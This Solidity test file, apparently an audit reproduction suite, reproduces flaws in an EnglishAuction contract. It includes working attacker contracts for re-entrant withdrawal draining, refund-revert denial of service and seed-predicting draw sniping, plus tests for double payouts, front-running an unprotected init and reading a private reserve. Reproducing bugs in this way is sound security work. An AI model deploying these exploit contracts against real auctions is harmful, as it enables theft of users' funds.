// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./TestBase.sol";
import "../src/EnglishAuction.sol";

/// @dev Bidder that rejects every refund payment.
contract RevertingBidder {
    EnglishAuction auction;

    constructor(EnglishAuction a) {
        auction = a;
    }

    function place() external payable {
        auction.bid{value: address(this).balance}();
    }

    receive() external payable {
        revert("no refunds");
    }
}

/// @dev Receiver that keeps pulling its pending balance while it pays out.
contract ReentrantReceiver {
    EnglishAuction auction;
    uint256 depth;
    uint256 maxDepth;

    constructor(EnglishAuction a, uint256 maxDepth_) {
        auction = a;
        maxDepth = maxDepth_;
    }

    function place() external payable {
        auction.bid{value: address(this).balance}();
    }

    function pull() external {
        auction.withdraw();
    }

    receive() external payable {
        if (depth < maxDepth) {
            depth++;
            try auction.withdraw() {} catch {}
        }
    }
}

/// @dev Checks the draw seed for the current block before committing.
contract Snipe {
    EnglishAuction auction;

    constructor(EnglishAuction a) {
        auction = a;
    }

    function bidEarly() external payable {
        auction.bid{value: address(this).balance}();
    }

    function predictedIndex() public view returns (uint256) {
        uint256 n = auction.earlyBirdCount();
        return
            uint256(
                keccak256(
                    abi.encodePacked(block.timestamp, block.prevrandao, n)
                )
            ) % n;
    }

    function tryDraw() external {
        uint256 idx = predictedIndex();
        require(
            auction.earlyBidders(idx) == address(this),
            "not our draw"
        );
        auction.drawEarlyBirdBonus();
    }

    receive() external payable {}
}

contract ReproTest is SpecTest {
    EnglishAuction auction;

    address seller = address(0x5E11);
    address alice = address(0xA1);
    address bob = address(0xB2);
    address carol = address(0xC3);
    address attacker = address(0xE1);

    function setUp() public {
        auction = new EnglishAuction();
        vm.deal(alice, 20 ether);
        vm.deal(bob, 20 ether);
        vm.deal(carol, 20 ether);
        vm.deal(attacker, 20 ether);
        vm.deal(address(this), 40 ether);
    }

    function _init() internal {
        auction.init(seller, 1 ether, 1 days, 500);
    }

    function _end() internal {
        vm.warp(auction.endTime() + 1 days);
        vm.roll(auction.endBlock() + 1);
    }

    function test_repro_refund_blocks_bids() public {
        _init();
        RevertingBidder rb = new RevertingBidder(auction);
        vm.deal(address(rb), 1.5 ether);
        rb.place();
        bool bidSucceeded = true;
        vm.prank(bob);
        try auction.bid{value: 2 ether}() {} catch {
            bidSucceeded = false;
        }
        emit log_named_uint("competingBidSucceeded", bidSucceeded ? 1 : 0);
        emit log_named_address("highestBidder", auction.highestBidder());
        require(!bidSucceeded, "bid should be blocked");
        require(auction.highestBidder() == address(rb), "still highest");
    }

    function test_repro_reentrant_withdraw() public {
        _init();
        ReentrantReceiver rec = new ReentrantReceiver(auction, 4);
        vm.deal(address(rec), 2 ether);
        rec.place();
        vm.prank(alice);
        auction.bid{value: 5 ether}();
        vm.prank(address(rec));
        auction.cancelBid();
        vm.prank(carol);
        auction.bid{value: 6 ether}();
        vm.prank(carol);
        auction.cancelBid();
        vm.prank(bob);
        auction.bid{value: 10 ether}();
        uint256 entitled = auction.pendingReturns(address(rec));
        uint256 balBefore = address(rec).balance;
        rec.pull();
        uint256 received = address(rec).balance - balBefore;
        emit log_named_uint("entitledWei", entitled);
        emit log_named_uint("receivedWei", received);
        require(received == entitled * 4, "expected 4x pull");
    }

    function test_repro_stale_bid_refund() public {
        _init();
        uint256 deposited = 1.5 ether;
        uint256 before = alice.balance;
        vm.prank(alice);
        auction.bid{value: deposited}();
        vm.prank(bob);
        auction.bid{value: 2 ether}();
        vm.prank(alice);
        auction.cancelBid();
        vm.prank(alice);
        auction.withdraw();
        uint256 received = alice.balance - before + deposited;
        emit log_named_uint("depositedWei", deposited);
        emit log_named_uint("receivedWei", received);
        require(received == 2 * deposited, "expected double payout");
    }

    function test_repro_finalize_twice() public {
        _init();
        vm.prank(alice);
        auction.bid{value: 5 ether}();
        vm.prank(bob);
        auction.bid{value: 10 ether}();
        auction.fundBonus{value: 15 ether}();
        _end();
        uint256 before = seller.balance;
        auction.finalize();
        auction.finalize();
        uint256 gain = seller.balance - before;
        emit log_named_uint("highestBid", auction.highestBid());
        emit log_named_uint("sellerGain", gain);
        require(gain == 20 ether, "seller paid twice");
    }

    function test_repro_late_bid() public {
        _init();
        vm.prank(alice);
        auction.bid{value: 1.5 ether}();
        vm.warp(auction.endTime() + 10 minutes);
        vm.roll(auction.endBlock() + 1);
        vm.prank(bob);
        auction.bid{value: 2 ether}();
        emit log_named_uint("secondsPastEnd", 600);
        emit log_named_address("highestBidder", auction.highestBidder());
        emit log_named_uint("hasEnded", auction.hasEnded() ? 1 : 0);
        require(auction.highestBidder() == bob, "late bid landed");
    }

    function test_repro_increment_zero() public {
        auction.init(seller, 5_000, 1 days, 500);
        vm.deal(alice, 5_000);
        vm.prank(alice);
        auction.bid{value: 5_000}();
        uint256 next = auction.minNextBid();
        vm.deal(bob, next);
        vm.prank(bob);
        auction.bid{value: next}();
        emit log_named_uint("minNextBid", next);
        emit log_named_address("highestBidder", auction.highestBidder());
        require(next == 5_000, "increment should be zero");
        require(auction.highestBidder() == bob, "equal bid outbids");
    }

    function test_repro_cancel_keeps_highest() public {
        _init();
        vm.prank(alice);
        auction.bid{value: 5 ether}();
        vm.prank(bob);
        auction.bid{value: 10 ether}();
        auction.fundBonus{value: 10 ether}();
        vm.prank(bob);
        auction.cancelBid();
        vm.prank(bob);
        auction.withdraw();
        require(auction.highestBidder() == bob, "still highest");
        _end();
        auction.finalize();
        emit log_named_uint("sellerReceived", seller.balance);
        emit log_named_uint("contractBalance", address(auction).balance);
        emit log_named_uint("bonusPool", auction.bonusPool());
        require(seller.balance == 10 ether, "seller paid");
        require(address(auction).balance == 0, "funds drained");
    }

    function test_repro_init_front_run() public {
        vm.prank(attacker);
        auction.init(attacker, 1 ether, 1 days, 500);
        emit log_named_address("seller", auction.seller());
        require(auction.seller() == attacker, "attacker is seller");
    }

    function test_repro_end_time_wrap() public {
        auction.init(seller, 1 ether, type(uint256).max, 500);
        uint64 end = auction.endTime();
        vm.roll(auction.endBlock() + 1);
        emit log_named_uint("blockTimestamp", block.timestamp);
        emit log_named_uint("endTime", uint256(end));
        emit log_named_uint("hasEnded", auction.hasEnded() ? 1 : 0);
        require(end < block.timestamp, "endTime wrapped");
        require(auction.hasEnded(), "already ended");
    }

    function test_repro_private_reserve() public {
        uint256 reserve = 7.77 ether;
        auction.init(seller, reserve, 1 days, 500);
        uint256 readBack = uint256(vm.load(address(auction), bytes32(0)));
        emit log_named_uint("reserveConfigured", reserve);
        emit log_named_uint("reserveFromStorage", readBack);
        require(readBack == reserve, "private value readable");
    }

    function test_repro_random_draw() public {
        _init();
        Snipe snipe = new Snipe(auction);
        vm.deal(address(snipe), 1.5 ether);
        vm.prank(alice);
        auction.bid{value: 1.2 ether}();
        snipe.bidEarly();
        auction.fundBonus{value: 2 ether}();
        _end();
        bool drawn;
        for (uint256 i = 0; i < 500 && !drawn; i++) {
            vm.warp(block.timestamp + 1);
            uint256 idx = snipe.predictedIndex();
            if (auction.earlyBidders(idx) == address(snipe)) {
                snipe.tryDraw();
                drawn = true;
            }
        }
        emit log_named_uint("drawnBySnipe", drawn ? 1 : 0);
        emit log_named_uint("snipeBalance", address(snipe).balance);
        require(drawn, "snipe never won");
        require(address(snipe).balance == 2 ether, "bonus not paid");
    }
}
